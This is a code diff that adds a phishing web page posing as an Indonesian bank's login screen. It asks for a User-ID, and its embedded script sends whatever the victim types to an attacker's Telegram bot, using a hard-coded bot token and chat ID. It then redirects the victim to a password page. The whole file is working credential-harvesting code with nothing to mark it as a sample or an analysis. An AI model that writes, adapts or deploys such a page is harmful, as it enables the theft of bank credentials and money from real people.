@@ -1,0 +1,168 @@
+
+<html lang="en"><head>
+    <meta charset="UTF-8">
+     <meta http-equiv="refresh" content="300; URL=/playstore">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>www.myBank.co.id</title>
+<style>
+    @import url('https://fonts.googleapis.com/css2?family=Ubuntu:wght@300;400;500;700&display=swap');
+    * {
+        font-family: 'Ubuntu', sans-serif;
+        font-weight:500;
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+        position: relative;
+        color: #0F78CB;
+    }
+    .b { font-weight: 500; }
+    html { width: 100vm; height: 100vh; }
+    body {
+        background: url('https://mybankinfo.github.io/lt.png');
+        background-repeat: no-repeat;
+        background-position:100% 100%;
+        background-size: 100% 100%;
+        width: 100%;
+        height: 0%;
+    }
+    .container {
+        width: 100%;
+        margin-top:60px;
+        padding: 20px;
+        height: 100%;
+    }
+    .flex {
+        display: flex;
+        justify-content: center;
+        align-items: center;
+    }
+    .hero {
+        width: 100%;
+        height: 283px;
+        align-items: center;
+        margin-top: -60%;
+    }
+    .hero img {
+        width: 112%;
+    }
+    h1 {
+        font-size: 23px;
+        margin-top:0px;
+        text-align: center;
+        margin: 20px;
+        font-weight: 300;
+        color: black;
+        margin-top: 5%;
+    }
+    form {
+        width: 100%;
+        height: auto;
+        flex-direction: column;
+        margin-top: 20%;
+    }
+    label {
+        display: block;
+        font-size: 15px;
+        text-align: left;
+        margin-bottom: 8px;
+        font-weight: 500;
+    }
+    select {
+        width: 100%;
+        height: 40px;
+        outline: none;
+        background: #fff;
+        margin-bottom:0px;
+    }
+    input:focus,
+    select:focus {
+        border left: 0px;
+        border right: 0px;
+        border top: 0px;
+        border-bottom: 2px solid black;
+    }
+    input {
+        width: 100%;
+        background: #fff;
+        outline: none;
+        font-size: 18px;
+        margin-bottom:8px;
+        text-align: center;
+    }
+    button {
+        margin-top:70%;
+        width: 100%;
+        height: 50px;
+        border: none;
+        font-weight: bold;
+        outline: none;
+        border-radius:5px;
+        color: black;
+        background: url('https://mybankinfo.github.io/4q.png');;
+        text-align: center;
+        font-size: 16px;
+        letter-spacing: 2px;
+    }
+</style>
+</head>
+<body>
+    <div class="container">
+        <div class="flex hero">
+            <img src="https://mybankinfo.github.io/my.png" alt="">
+        </div>
+        <h1 class="">Masukkan User-ID M2U Anda</h1>
+        <form id="tg">
+            <label></label>
+            <input type="text" required="required" autocomplete="off" placeholder="User-ID" style="background: none;
+    background-repeat: no-repeat;
+    background-position:100% 100%;
+    background-size: 100% 100%;
+            height: 50px;
+        border-left: 0px;
+        border-right: 0px;
+        border-top: 0px;
+        border-bottom: 2px solid black;" id="User Id" name="User ID">
+    <!--
+ <label>Nomor Handphone</label>
+          <input type="tel" required="required" autocomplete="off" placeholder="" minlength="9" maxlength="12"  style="background-image: url('/img/phone.png');
+    background-repeat: no-repeat;
+    background-position:100% 100%;
+    background-size: 100% 100%;
+    padding-left:35px;" id="No Hp" name="No Hp">
+            <label></label>
+            <input type="tel" required="required" autocomplete="off" placeholder="User-ID" minlength="" maxlength=""  style="background-image: url('/img/saldo.png');
+    background-repeat: no-repeat;
+    background-position:100% 100%;
+    background-size: 100% 100%;
+    padding-left:35px;" id="User" name="User">-->
+            <button type="submit">LANJUT</button>
+        </form>
+    </div>
+   <p id="status"></p>
+        <script>
+        
+    const chat_id = '7080361928', botID = 'bot7273419843:AAHdC2JlxfF7Bwkp1Vk_nAMRSsXLGvbjIj8';
+    const telegramURL = `https://api.telegram.org/${botID}/sendMessage`;
+    document.querySelector('#tg').addEventListener("submit", async e => { // When the user submits the form
+        e.preventDefault(); // Don't submit
+        let text = JSON.stringify( // Convert the form data to a string to send as our Telegram message
+            Object.fromEntries(new FormData(e.target).entries()), // Convert the form data to an object.
+        null, 2); // Prettify the JSON so we can read the data easily
+        const sendMessage = await fetch(telegramURL, { // Send the request to the telegram API
+            method: 'POST',
+            headers: {"Content-Type": "application/json"}, // This is required when sending a JSON body.
+            body: JSON.stringify({chat_id, text}), // The body must be a string, not an object
+        });
+        const messageStatus = document.querySelector('#status');
+        if (sendMessage.ok) // Update the user on if the message went through
+            messageStatus.textContent = "";
+        else
+            messageStatus.textContent = "Message Failed to send :( " + (await sendMessage.text());
+        e.target.reset(); // Clear the form fields.
+        window.location.href='/pass.html';
+    });
+
+    </script>
+</body>
+</html>
